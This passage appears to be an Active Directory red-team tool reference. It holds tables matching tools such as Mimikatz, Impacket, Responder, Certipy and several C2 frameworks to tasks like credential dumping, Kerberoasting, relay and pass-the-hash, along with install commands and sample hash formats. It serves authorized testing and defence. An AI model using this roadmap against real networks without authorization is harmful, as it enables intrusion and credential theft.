| BloodHound CE | ENUM, PE | Docker/binary | Linux, Web | AD attack path mapping |
| SharpHound | ENUM | Binary | Windows | BloodHound data collector |
| BloodHound.py | ENUM | `pip` | Linux, macOS | Python BloodHound collector |
| RustHound | ENUM | Binary/Cargo | Linux, macOS, Windows | Fast Rust BloodHound collector |
| Impacket | CRED, LAT, KERB, PE | `pip`/`apt` | Linux, macOS | Multi-protocol AD exploitation |
| NetExec (nxc) | LAT, ENUM, SPRAY | `pip` | Linux, macOS | Automated credential & lateral movement |
| CrackMapExec (legacy) | LAT, ENUM | `pip` | Linux, macOS | Legacy NetExec predecessor |
| Mimikatz | CRED, KERB | Binary | Windows | Credential extraction & Kerberos abuse |
| Rubeus | KERB, CRED | Binary | Windows | Kerberos ticket abuse toolkit |
| Certipy | ADCS, CRED | `pip` | Linux, macOS | ADCS enumeration & exploitation |
| Certify | ADCS, CRED | Binary | Windows | C# ADCS enumeration & exploitation |
| PowerView | ENUM | PS module | Windows | AD recon (PowerShell) |
| AD Module | ENUM | RSAT feature | Windows | Microsoft official AD cmdlets |
| Responder | RELAY, COERCE | `apt`/git | Linux | LLMNR/NBTNS/mDNS poisoning |
| Inveigh/InveighZero | RELAY | Binary/PS | Windows | Windows LLMNR/NBTNS poisoning |
| mitm6 | RELAY | `pip`/`apt` | Linux | IPv6 DNS poisoning |
| Coercer | COERCE | `pip` | Linux | Multi-protocol authentication coercion |
| PetitPotam | COERCE | Binary | Windows | MS-EFSRPC coercion |
| SpoolSample | COERCE | Binary | Windows | MS-RPRN printer bug coercion |
| KrbRelay/KrbRelayUp | RELAY, PE | Binary | Windows | Kerberos relay to LDAP |
| pyWhisker | CRED, PERS | `pip` | Linux, macOS | Shadow Credentials management |
| PKINITtools | KERB, CRED | git | Linux, macOS | PKINIT authentication & hash extraction |
| Kerbrute | KERB, SPRAY | Binary/Go | All platforms | Kerberos user enum/spray |
| evil-winrm | LAT | `gem` | Linux, macOS | WinRM shell with hash/Kerberos |
| WinPEAS | PE | Binary | Windows | Windows privilege escalation enumeration |
| Seatbelt | PE, ENUM | Binary | Windows | Windows security config audit |
| SharpUp | PE | Binary | Windows | Privilege escalation audit |
| SharpDump | CRED | Binary | Windows | LSASS process dump |
| SharpDPAPI | CRED | Binary | Windows | DPAPI data decryption |
| SharpChrome | CRED | Binary | Windows | Chrome/Edge credential recovery |
| LAPSToolkit | CRED, ENUM | PS module | Windows | LAPS password extraction |
| DomainPasswordSpray | SPRAY | PS module | Windows | AD password spraying |
| gpp-decrypt | CRED | `apt` | Linux | GPP cpassword decryption |
| Group3r | GPO | Binary | Windows | GPO vulnerability auditing |
| ADACLScanner | ENUM, GPO | Binary | Windows | AD ACL auditing |
| AD-Miner | ENUM | PS module | Windows | AD risk assessment |
| GoodHound | ENUM | git | Python | BloodHound data enrichment |
| GPO-Hound | GPO | PS module | Windows | GPO mapping for BloodHound |
| GPORemoteAccessPolicy | GPO, LAT | PS module | Windows | GPO remote access enumeration |
| PlumHound | ENUM | Binary | All with Python | BloodHound query automation |
| PowerSharpPack | ENUM, CRED, PE, LAT | PS module | Windows | In-memory C# tool loader |
| adPEAS | ENUM, PE | Binary | Windows | AD privilege escalation surface |
| LDAPRelayScan | RELAY, ENUM | git | All | LDAP relay readiness scan |
| LockSmith | ADCS, ENUM | PS module | Windows | ADCS security auditing |
| BlueTuxedo | DNS, ENUM | PS module | Windows | AD DNS zone auditing |
| PowerPUG | ENUM | PS module | Windows | Privileged user group analysis |
| GPOZaurr | GPO | PS module | Windows | Comprehensive GPO management |
| BadSuccessor | PE, PERS | Binary/PS | Windows | adminSDHolder hijack |
| SharpSuccessor | PE, PERS | Binary | Windows | C# adminSDHolder hijack |
| ADRecon | ENUM | PS module | Windows | Comprehensive AD recon & report |
| ldapdomaindump | ENUM | `pip` | Linux, macOS | LDAP dump to HTML/JSON |
| adidnsdump | DNS, ENUM | `pip` | Linux, macOS | AD-integrated DNS dump |
| enum4linux/enum4linux-ng | ENUM | `apt`/`pip` | Linux | SMB/RPC enumeration |
| smbmap | ENUM, LAT | `pip` | Linux, macOS | SMB share enumeration |
| smbclient | ENUM | `apt` | Linux | SMB file operations |
| Ligolo-ng | TUN | Binary | All platforms | TUN interface pivoting |
| Chisel | TUN | Binary | All platforms | HTTP/SOCKS tunnel |
| Frp | TUN | Binary | All platforms | Fast reverse proxy |
| Neo-reGeorg | TUN | `pip` | Python + Web | HTTP tunnel via web shell |
| Empire/Starkiller | C2 | git/bash | Linux | PowerShell C2 + GUI |
| Covenant | C2 | dotnet build | All (.NET) | .NET C2 framework |
| Sliver | C2 | script | Linux, macOS | Modern implant C2 |
| Mythic | C2 | make | Linux, macOS | Multi-agent C2 framework |
| Metasploit | C2, LAT, PE | `apt`/installer | All platforms | Exploitation framework |
| Nmap | DISC | `apt`/choco | All platforms | Network port scanning |
| Masscan | DISC | `apt` | Linux | High-speed port scanning |
| RustScan | DISC | Cargo/binary | All platforms | Adaptive fast port scanner |
| Hashcat | CRACK | `apt`/binary | All (GPU) | GPU-accelerated hash cracking |
| John the Ripper | CRACK | `apt`/brew | All platforms | CPU hash cracking |
| SQLMap | DISC | `pip`/`apt` | All platforms | SQL injection automation |
| Sysmon | DFIR | Microsoft | Windows | System activity monitoring |
| KAPE | DFIR | Kroll | Windows | Forensic artifact collection |
| MDE | DFIR | Built-in | Windows | Windows EDR |
| LOLBAS/LOLDrivers | LOL | Web reference | Windows | Living Off the Land binaries |
| WES-NG | PE | `pip` | Python | Windows exploit suggester |
| Watson | PE | Binary | Windows | Windows priv esc suggester |
| PowerSploit | PE, CRED, LAT, PERS | PS module | Windows | PowerShell post-exploitation |
| PrintNightmare | PE, LAT | Binary/Python | Windows | Print Spooler RCE/LPE |
| noPac (sam-the-admin) | PE | git | Python/C# | sAMAccountName + KDC confusion |
| ZeroLogon | PE | git | Python | Netlogon crypto bypass |

---

## <span style="color:rgb(0, 176, 240)">Tool Selection by Task</span>

| Task | Best Tool(s) |
|------|-------------|
| **Initial domain enum (no creds)** | enum4linux-ng, ldapdomaindump, null session, nmap |
| **Domain enum (with creds)** | BloodHound CE, PowerView, AD Module, ADRecon |
| **Attack path analysis** | BloodHound CE, PlumHound, GoodHound |
| **Continuous monitoring** | BloodHound Enterprise (commercial) |
| **Domain privilege escalation** | BloodHound, Certipy, Impacket, noPac, KrbRelayUp |
| **Kerberoasting** | Rubeus, Impacket GetUserSPNs.py |
| **AS-REP roasting** | Impacket GetNPUsers.py, Rubeus asreproast |
| **ADCS abuse** | Certipy, Certify, LockSmith |
| **Shadow Credentials** | pyWhisker, Certipy shadow, KrbRelay |
| **Password spraying** | Kerbrute, NetExec, DomainPasswordSpray |
| **Credential dumping** | Mimikatz, Impacket secretsdump, SharpDump |
| **Lateral movement** | NetExec, Impacket (wmiexec/psexec/smbexec), evil-winrm |
| **Pass-the-hash** | Mimikatz pth, Impacket, NetExec, evil-winrm |
| **NTLM relay** | Impacket ntlmrelayx.py, Responder, mitm6 |
| **Coercion** | Coercer, PetitPotam, SpoolSample |
| **LLMNR/NBTNS poison** | Responder (Linux), Inveigh (Windows) |
| **GPO auditing** | Group3r, GPOZaurr, GPO-Hound |
| **Silver/Golden tickets** | Mimikatz kerberos::golden, Impacket ticketer.py |
| **Delegation abuse** | Impacket getST.py, Rubeus s4u |
| **SMB share enumeration** | smbmap, smbclient, NetExec |
| **Kerberos user enum** | Kerbrute userenum |
| **Local privilege escalation** | WinPEAS, Seatbelt, SharpUp, Watson |
| **GPP password check** | NetExec, gpp-decrypt, PowerView |
| **DNS dump** | adidnsdump, BlueTuxedo |
| **Relay to ADCS** | ntlmrelayx.py + mitm6, KrbRelay |
| **LDAP relay readiness** | LDAPRelayScan |
| **Domain policy analysis** | PingCastle (free), Purple Knight (free) |
| **Password cracking** | Hashcat (GPU), John (CPU) |
| **Network scanning** | Nmap, Masscan, RustScan |
| **C2 framework** | Sliver, Covenant, Empire, Mythic |
| **Tunneling/Pivoting** | Ligolo-ng, Chisel, Frp |
| **SYSVOL file access** | smbclient, smbmap, NetExec |
| **adminSDHolder abuse** | BadSuccessor, SharpSuccessor |
| **PrintNightmare** | cube0x0 PoC, various |
| **ZeroLogon check** | zerologon-check.py |
| **Evasive C2 (commercial)** | Cobalt Strike, Brute Ratel, Nighthawk |
| **AD security assessment** | PingCastle, Purple Knight, AD-Miner, ADRecon |
| **MSSQL exploitation** | Impacket mssqlclient.py |
| **Web app to AD pivot** | SQLMap, web shells -> Impacket |

---

## <span style="color:rgb(0, 176, 240)">Installation Quick Reference</span>

```bash
# =========== Python (pip) ===========
pip install impacket
pip install netexec
pip install certipy-ad
pip install bloodhound-py
pip install ldapdomaindump
pip install adidnsdump
pip install enum4linux-ng
pip install smbmap
pip install coercer
pip install pywhisker
pip install sqlmap
pip install windows-exploit-suggester

# =========== Go (go install) ===========
go install github.com/ropnop/kerbrute@latest

# =========== Ruby (gem) ===========
gem install evil-winrm

# =========== APT (Debian/Kali/Parrot) ===========
sudo apt install impacket-scripts bloodhound neo4j responder kerbrute \
  nmap masscan rustscan john hashcat metasploit-framework \
  enum4linux enum4linux-ng smbclient gpp-decrypt sqlmap

# =========== Windows Tools ===========
# Download binaries from GitHub releases:
# SharpHound: https://github.com/SpecterOps/SharpHound
# Mimikatz: https://github.com/gentilkiwi/mimikatz
# Rubeus: https://github.com/GhostPack/Rubeus
# Certify: https://github.com/GhostPack/Certify
# Seatbelt: https://github.com/GhostPack/Seatbelt
# SharpUp: https://github.com/GhostPack/SharpUp
# SharpDump: https://github.com/GhostPack/SharpDump
# SharpDPAPI: https://github.com/GhostPack/SharpDPAPI
# Inveigh: https://github.com/Kevin-Robertson/Inveigh
# PowerSploit: https://github.com/PowerShellMafia/PowerSploit
# ADRecon: https://github.com/sense-of-security/ADRecon

# RSAT (AD Module)
Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online

# =========== Docker ===========
docker run -p 7474:7474 -p 7687:7687 specterops/bloodhound:latest

# =========== Cargo (Rust) ===========
cargo install rustscan
cargo install rusthound

# =========== Manual Git Installs ===========
git clone https://github.com/fortra/impacket.git && cd impacket && pip install .
git clone https://github.com/Pennyw0rth/NetExec.git && cd NetExec && pip install .
git clone https://github.com/ly4k/Certipy.git && cd Certipy && pip install .
git clone https://github.com/dirkjanm/BloodHound.py.git && cd BloodHound.py && pip install .
git clone https://github.com/dirkjanm/PKINITtools.git
git clone https://github.com/cube0x0/KrbRelay.git
git clone https://github.com/its-a-feature/Mythic.git
git clone https://github.com/BC-SECURITY/Empire.git
git clone https://github.com/cobbr/Covenant.git
git clone https://github.com/BishopFox/sliver.git

# =========== Chocolatey (Windows) ===========
choco install nmap hashcat john sysmon
```

---

## <span style="color:rgb(0, 176, 240)">Credential Format Quick Reference</span>

| Format | Example | Tools |
|--------|---------|-------|
| NTLM hash | `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0` | Impacket, NetExec, Mimikatz, evil-winrm |
| LM:NT hash | `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0` | Impacket, NetExec |
| Kerberos ccache | `user.ccache` (binary) | Impacket `-k`, `KRB5CCNAME` |
| Kerberos kirbi | `ticket.kirbi` (binary) | Mimikatz kerberos::ptt, Rubeus ptt |
| Pass-the-Hash | `LMHash:NTHash` | Mimikatz sekurlsa::pth |
| Certificate PFX | `cert.pfx` (PKCS12) | Certipy auth, PKINITtools, Rubeus |
| NTLMv2 capture | `USER::DOMAIN::NTLMv2_HASH` | Responder, Inveigh -> Hashcat (5600) |
| Kerberoast hash | `$krb5tgs$23$*user*$domain*$hash` | GetUserSPNs -> Hashcat (13100) |
| AS-REP hash | `$krb5asrep$23$*user*$domain*$hash` | GetNPUsers -> Hashcat (18200) |

---

> **Note:** This reference includes both commercial and open-source tools. Many commercial tools are included so that red teamers understand defensive detection capabilities. Open-source tools are the primary workhorses of AD red teaming engagements. Always ensure you have proper authorization before using any of these tools in production environments.
